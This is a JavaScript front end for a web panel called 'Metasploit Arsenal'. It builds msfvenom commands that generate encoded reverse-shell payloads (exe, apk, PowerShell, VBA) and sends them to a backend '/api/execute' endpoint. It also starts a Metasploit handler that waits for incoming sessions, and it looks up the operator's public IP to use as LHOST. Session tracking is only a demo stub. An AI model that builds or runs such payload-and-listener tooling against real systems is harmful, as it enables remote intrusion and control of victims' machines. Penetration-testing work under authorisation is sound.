// Metasploit Arsenal JavaScript
document.addEventListener('DOMContentLoaded', function() {

// Configuration
const API_BASE = window.appConfig?.KALI_MCP_ENDPOINT || 'http://localhost:3001';
let activeListener = null;
let generatedPayloads = [];
let activeSessions = [];

// Initialize
loadSavedPayloads();

// Payload Generator
document.getElementById('generatePayloadBtn').addEventListener('click', async function() {
    const btn = this;
    const output = document.getElementById('payloadOutput');
    
    const payloadType = document.getElementById('payloadType').value;
    const format = document.getElementById('payloadFormat').value;
    const lhost = document.getElementById('lhost').value;
    const lport = document.getElementById('lport').value;
    const encoder = document.getElementById('encoder').value;
    const iterations = document.getElementById('iterations').value;
    
    if (!lhost) {
        alert('Please enter LHOST (your IP address)');
        return;
    }
    
    btn.disabled = true;
    btn.innerHTML = '<span>⏳ Generating...</span>';
    output.style.display = 'block';
    output.innerHTML = `<div style="color: #FCD34D;">Generating payload with msfvenom...</div>`;
    
    try {
        // Build msfvenom command
        let args = [
            '-p', payloadType,
            `LHOST=${lhost}`,
            `LPORT=${lport}`,
            '-f', format
        ];
        
        if (encoder) {
            args.push('-e', encoder);
            args.push('-i', iterations);
        }
        
        // Add output filename
        const timestamp = Date.now();
        const extension = getFileExtension(format);
        const filename = `payload_${timestamp}.${extension}`;
        args.push('-o', `/tmp/${filename}`);
        
        const response = await fetch(`${API_BASE}/api/execute`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                command: 'msfvenom',
                args: args
            })
        });
        
        const data = await response.json();
        
        if (response.ok) {
            output.innerHTML = `
                <div style="color: #10B981;">✅ Payload generated successfully!</div>
                <div style="margin-top: 10px; color: #D1D5DB;">Command executed:</div>
                <div style="color: #9CA3AF; margin: 5px 0;">msfvenom ${args.join(' ')}</div>
                <div style="margin-top: 10px; color: #D1D5DB;">Output:</div>
                <div style="color: #9CA3AF;">${escapeHtml(data.result || data.stderr)}</div>
            `;
            
            // Save payload info
            const payload = {
                id: timestamp,
                name: filename,
                type: payloadType,
                format: format,
                lhost: lhost,
                lport: lport,
                encoder: encoder || 'None',
                created: new Date().toISOString(),
                path: `/tmp/${filename}`,
                size: 'Unknown'
            };
            
            generatedPayloads.unshift(payload);
            savePayloads();
            updatePayloadsList();
        } else {
            throw new Error(data.error || 'Failed to generate payload');
        }
    } catch (error) {
        output.innerHTML = `<div style="color: #EF4444;">❌ Error: ${error.message}</div>`;
    } finally {
        btn.disabled = false;
        btn.innerHTML = '<span>🔨 Generate Payload</span>';
    }
});

// Start Listener
document.getElementById('startListenerBtn').addEventListener('click', async function() {
    const btn = this;
    const output = document.getElementById('listenerOutput');
    const statusIndicator = document.getElementById('statusIndicator');
    const statusText = document.getElementById('statusText');
    const listenerInfo = document.getElementById('listenerInfo');
    
    const handlerType = document.getElementById('handlerType').value;
    const payload = document.getElementById('handlerPayload').value;
    const lhost = document.getElementById('listenerLhost').value;
    const lport = document.getElementById('listenerLport').value;
    
    if (!lhost) {
        alert('Please enter Listen IP');
        return;
    }
    
    btn.disabled = true;
    output.style.display = 'block';
    output.innerHTML = `<div style="color: #FCD34D;">Starting Metasploit listener...</div>`;
    
    try {
        // Build msfconsole command for handler
        const msfCommand = `use ${handlerType}; set PAYLOAD ${payload}; set LHOST ${lhost}; set LPORT ${lport}; set ExitOnSession false; exploit -j -z`;
        
        const response = await fetch(`${API_BASE}/api/tools/metasploit`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                command: msfCommand
            })
        });
        
        const data = await response.json();
        
        if (response.ok) {
            activeListener = {
                handler: handlerType,
                payload: payload,
                lhost: lhost,
                lport: lport,
                started: new Date().toISOString()
            };
            
            statusIndicator.className = 'status-indicator active';
            statusText.textContent = 'Active';
            listenerInfo.innerHTML = `
                <div>Handler: ${handlerType}</div>
                <div>Payload: ${payload}</div>
                <div>Listening on: ${lhost}:${lport}</div>
                <div>Started: ${new Date().toLocaleTimeString()}</div>
            `;
            
            output.innerHTML = `
                <div style="color: #10B981;">✅ Listener started successfully!</div>
                <div style="margin-top: 10px; color: #9CA3AF;">${escapeHtml(data.result)}</div>
                <div style="margin-top: 10px; color: #FCD34D;">⚠️ Note: Listener is running in background. Sessions will appear below when connections are established.</div>
            `;
            
            document.getElementById('startListenerBtn').style.display = 'none';
            document.getElementById('stopListenerBtn').style.display = 'block';
            
            // Start polling for sessions (in real implementation)
            startSessionPolling();
        } else {
            throw new Error(data.error || 'Failed to start listener');
        }
    } catch (error) {
        output.innerHTML = `<div style="color: #EF4444;">❌ Error: ${error.message}</div>`;
        btn.disabled = false;
    }
});

// Stop Listener
document.getElementById('stopListenerBtn').addEventListener('click', function() {
    activeListener = null;
    activeSessions = [];
    
    document.getElementById('statusIndicator').className = 'status-indicator inactive';
    document.getElementById('statusText').textContent = 'Inactive';
    document.getElementById('listenerInfo').innerHTML = 'No active listener';
    document.getElementById('listenerOutput').innerHTML = `<div style="color: #FCD34D;">Listener stopped</div>`;
    document.getElementById('sessionsContainer').innerHTML = '';
    
    document.getElementById('startListenerBtn').style.display = 'block';
    document.getElementById('stopListenerBtn').style.display = 'none';
});

// Session polling (simulated)
function startSessionPolling() {
    // In a real implementation, this would poll the Metasploit API
    // For demo purposes, we'll simulate it
    setTimeout(() => {
        if (activeListener) {
            // Simulate a session connection (for demo)
            // In production, this would check actual Metasploit sessions
        }
    }, 5000);
}

// Helper Functions
function getFileExtension(format) {
    const extensions = {
        'exe': 'exe',
        'elf': 'elf',
        'apk': 'apk',
        'war': 'war',
        'raw': 'bin',
        'c': 'c',
        'python': 'py',
        'powershell': 'ps1',
        'vba': 'vba'
    };
    return extensions[format] || 'bin';
}

function updatePayloadsList() {
    const list = document.getElementById('payloadsList');
    
    if (generatedPayloads.length === 0) {
        list.innerHTML = '<p style="color: #9CA3AF; text-align: center;">No payloads generated yet</p>';
        return;
    }
    
    list.innerHTML = generatedPayloads.map(payload => `
        <div class="payload-item">
            <div class="payload-info">
                <div class="payload-name">${payload.name}</div>
                <div class="payload-details">
                    Type: ${payload.type} | Format: ${payload.format} | 
                    Target: ${payload.lhost}:${payload.lport} | 
                    Encoder: ${payload.encoder}
                </div>
                <div class="payload-details" style="margin-top: 5px;">
                    Created: ${new Date(payload.created).toLocaleString()}
                </div>
            </div>
            <div class="payload-actions">
                <button class="btn-small" onclick="downloadPayload('${payload.id}')">
                    📥 Download
                </button>
                <button class="btn-small" onclick="deletePayload('${payload.id}')">
                    🗑️ Delete
                </button>
            </div>
        </div>
    `).join('');
}

window.downloadPayload = async function(payloadId) {
    const payload = generatedPayloads.find(p => p.id == payloadId);
    if (!payload) return;
    
    try {
        // In production, this would download the actual file from the server
        // For now, we'll show instructions
        const modal = document.createElement('div');
        modal.style.cssText = `
            position: fixed; top: 0; left: 0; right: 0; bottom: 0;
            background: rgba(0,0,0,0.8); display: flex; align-items: center;
            justify-content: center; z-index: 10000;
        `;
        modal.innerHTML = `
            <div style="background: #1F2937; padding: 30px; border-radius: 12px; max-width: 600px; border: 1px solid #8B5CF6;">
                <h3 style="color: #A78BFA; margin-bottom: 20px;">📥 Download Payload</h3>
                <div style="color: #D1D5DB; margin-bottom: 20px;">
                    <strong>Payload:</strong> ${payload.name}<br>
                    <strong>Path:</strong> ${payload.path}
                </div>
                <div style="background: #0F172A; padding: 15px; border-radius: 8px; margin-bottom: 20px;">
                    <div style="color: #FCD34D; margin-bottom: 10px;">To download this payload:</div>
                    <div style="color: #9CA3AF; font-family: monospace; font-size: 13px;">
                        # Via SCP:<br>
                        scp user@server:${payload.path} .<br><br>
                        # Via HTTP (if server is running):<br>
                        wget http://your-server${payload.path}<br><br>
                        # Via curl:<br>
                        curl -O http://your-server${payload.path}
                    </div>
                </div>
                <button class="btn-msf" onclick="this.parentElement.parentElement.remove()">Close</button>
            </div>
        `;
        document.body.appendChild(modal);
        
    } catch (error) {
        alert('Error: ' + error.message);
    }
};

window.deletePayload = function(payloadId) {
    if (!confirm('Delete this payload?')) return;
    
    generatedPayloads = generatedPayloads.filter(p => p.id != payloadId);
    savePayloads();
    updatePayloadsList();
};

function savePayloads() {
    try {
        localStorage.setItem('msf_payloads', JSON.stringify(generatedPayloads));
    } catch (e) {
        console.error('Failed to save payloads:', e);
    }
}

function loadSavedPayloads() {
    try {
        const saved = localStorage.getItem('msf_payloads');
        if (saved) {
            generatedPayloads = JSON.parse(saved);
            updatePayloadsList();
        }
    } catch (e) {
        console.error('Failed to load payloads:', e);
    }
}

function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

// Auto-detect local IP for LHOST
async function detectLocalIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        document.getElementById('lhost').value = data.ip;
        document.getElementById('listenerLhost').value = '0.0.0.0';
    } catch (error) {
        console.log('Could not detect IP:', error);
    }
}

// Detect IP on load
detectLocalIP();

});
